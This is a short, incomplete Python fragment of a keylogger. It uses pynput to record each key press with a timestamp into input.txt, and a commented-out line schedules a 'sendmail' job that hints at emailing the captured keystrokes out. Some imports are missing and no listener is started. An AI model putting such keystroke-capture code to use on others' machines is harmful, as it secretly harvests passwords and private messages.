from pynput import keyboard

def on_press(key):
    print(datetime.datetime.now().strftime("%H:%M:%S"))
    try:
        f=open('input.txt',"a")
        f.write(key.char)
        #schedule.every(1).minutes.do(sendmail)
        print('alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        print('special key {0} pressed'.format(key))
        #print(keyboard.KeyCode)
        if key==keyboard.Key.space:
            f.write(' ')
        if key==keyboard.Key.enter:
            f.write(os.linesep)
    

